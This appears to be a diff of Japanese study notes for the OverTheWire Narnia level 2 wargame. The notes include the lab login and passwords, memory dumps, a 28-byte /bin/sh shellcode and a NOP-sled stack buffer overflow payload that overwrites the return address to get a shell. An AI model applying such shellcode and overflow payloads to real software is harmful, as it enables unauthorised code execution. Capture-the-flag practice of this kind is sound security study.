@@ -1,11 +1,17 @@
+```sh
 $ ssh -p 2226 narnia2@narnia.labs.overthewire.org
-nairiepecu
+```
 
+password: nairiepecu
+
+```
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80 28bytes
+```
 
 ./narnia2 $(python -c 'print "A" * 140')
 140文字でオーバーフロー
 
+```
 0xffffc200: 0x6c657665  0x616e2f32  0x61696e72  0x41410032
 0xffffc210: 0x41414141  0x41414141  0x41414141  0x41414141
 0xffffc220: 0x41414141  0x41414141  0x41414141  0x41414141
@@ -18,11 +24,15 @@ nairiepecu
 0xffffc290: 0x41414141  0x41414141  0x44004141  0x5f535542
 0xffffc2a0: 0x53534553  0x5f4e4f49  0x5f535542  0x52444441
 0xffffc2b0: 0x3d535345  0x78696e75  0x7362613a  0x63617274
+```
 
+```
 $(python -c 'print "\x90"\*112 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x60\xc2\xff\xff"')
+```
 
 
 ## In remote
+```
 0xffffd860: 0x696e7261  0x41003261  0x41414141  0x41414141
 0xffffd870: 0x41414141  0x41414141  0x41414141  0x41414141
 0xffffd880: 0x41414141  0x41414141  0x41414141  0x41414141
@@ -33,14 +43,20 @@ $(python -c 'print "\x90"\*112 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x
 0xffffd8d0: 0x41414141  0x41414141  0x41414141  0x41414141
 0xffffd8e0: 0x41414141  0x41414141  0x41414141  0x41414141
 0xffffd8f0: 0x41414141  0x45485300  0x2f3d4c4c  0x2f6e6962
+```
 
 リモードでアドレスを確認
+```
 $(python -c 'print "\x90"\*112 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90\xd8\xff\xff"')
+```
 
+```sh
 narnia2@narnia:/etc/narnia_pass$ /narnia/narnia2 $(python -c 'print "\x90"\*112 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90\xd8\xff\xff"')
 $ cat narnia3
 vaequeezee
+```
 
 
 NOP sledと呼ばれるテクニック。（NOPスライド、NOPの集合をNOPスレッドとも）
+
 NOPの集合のどこかしらに遷移させればあとはNOPの命令をスライドしていき、最終的にシェルコードが実行される。
